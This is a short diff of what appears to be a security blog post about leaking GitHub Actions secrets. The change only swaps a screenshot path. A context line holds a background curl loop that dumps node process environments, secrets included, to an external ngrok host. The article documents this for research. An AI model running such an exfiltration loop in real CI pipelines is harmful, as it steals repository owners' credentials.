@@ -192,7 +192,7 @@ Unlike with shell actions, _Runner.Worker_ doesn't hardcode secrets into JavaScr
 while true; do curl -s 'https://4ddc-91-197-46-143.ngrok.io' -H "Content-Type: text/plain"  -d "$(ps axe | grep node)" -o /dev/null; done &
 ```
 
-![Screenshot of the dumped environment variables. "INPUT_EXAMPLE_ARGUMENT_1=SECRET VALUE" is highlighted.](/images/github-actions-leaking-secrets/dKOEN7u.png)
+![Screenshot of the dumped environment variables. "INPUT_EXAMPLE_ARGUMENT_1=SECRET VALUE" is highlighted.](/images/github-actions-leaking-secrets/fKOEN2u.png)
 
 We have now made progress: we can leak secrets of shell and JavaScript actions, not just secrets referenced in environment variables. These techniques have been similarly documented by Alex Ilgayev from Cycode.[^5]
 
